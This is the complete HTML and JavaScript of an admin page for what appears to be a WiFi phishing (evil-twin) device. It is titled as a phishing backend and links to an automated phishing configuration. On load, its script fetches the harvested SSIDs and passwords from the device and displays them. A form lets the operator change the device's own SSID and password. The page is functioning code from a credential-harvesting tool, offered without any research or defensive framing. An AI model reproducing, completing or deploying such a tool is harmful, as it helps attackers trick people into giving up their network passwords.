<!DOCTYPE html><html lang="cn"><head><meta charset="UTF-8"><title>WiFi钓鱼后台</title><style>#login{background:#d0d3d4;width:100%;height:100%;background-size:100% 100%;position:fixed;z-index:-1;top:0;left:0}#login-box{width:300px;overflow:hidden;margin:0 auto}.login-box-square{width:105px;margin:0 auto;border-radius:50%;background-color:#a9a9a9;position:relative;overflow:hidden}.login-box-square::after{content:"";display:block;padding-bottom:100%}.login-box-square .content{position:absolute;width:100%;height:100%}input{width:90%;display:block;border:0;margin:0 auto;line-height:36px;font-size:20px;padding:0 1em;border-radius:5px;margin-bottom:11px}.mm-username,.ssid-username{width:91%;font-size:13px;color:#999}.mm-username{width:calc(91% - 54px);-webkit-border-radius:2px 0 0 2px;-moz-border-radius:2px 0 0 2px;border-radius:5px 0 0 5px;margin:0;float:left}.login-submit{margin:0;float:left;-webkit-border-radius:0 5px 5px 0;-moz-border-radius:0 5px 5px 0;border-radius:0 5px 5px 0;background-color:#e2a3cb;width:54px;display:inline-block;height:36px;line-height:36px;padding:0 auto;color:#fff;white-space:nowrap;text-align:center;font-size:14px;border:none;cursor:pointer;opacity:.9}</style></head><body><div id="login"><div style="height:10%;min-height:120px"></div><div id="login-box"><p style="font-size:32px;color:#5e5e5e;text-align:center"><a style="color:#5e5e5e" href="/dyconfig">点击进入自动化WiFi钓鱼配置</a></p><p style="font-size:32px;color:#5e5e5e;text-align:center">记录信息</p><p style="font-size:15px;color:#5e5e5e;text-align:center" id="sj">正在获取</p><p style="font-size:24px;color:#5e5e5e;text-align:center">修改本机设置</p><input type="text" id="ssid" placeholder="SSID" class="ssid-username"> <input type="text" id="mm" placeholder="密码长度至少8位" class="mm-username"> <input type="submit" value="提交" id="btn-login" class="login-submit" onclick="opera()"><p></p><p></p></div></div><script type="text/javascript">function opera(){var e;""!=document.getElementById("ssid").value&&""!=document.getElementById("mm").value&&8<=document.getElementById("mm").value.length?/.*[\u4e00-\u9fa5]+.*$/.test(document.getElementById("mm").value)?alert("密码不能包含中文！"):(window.XMLHttpRequest&&(e=new XMLHttpRequest),e.onreadystatechange=function(){200==e.status&&alert("成功等待重启")},e.open("GET","/set?ssid="+document.getElementById("ssid").value+"&password="+document.getElementById("mm").value),e.send()):alert("参数不完整")}window.onload=function(){var d;window.XMLHttpRequest&&(d=new XMLHttpRequest),d.onreadystatechange=function(){if(200==d.status){for(var e=d.responseText.split(","),t="",n=0;n<e.length-1;n++)n%2==0&&(t=t+"<p>SSID:"+e[n]+"密码:"+e[n+1]+"</p>");document.getElementById("sj").innerHTML=t}},d.open("GET","/get"),d.send()}</script></body></html>
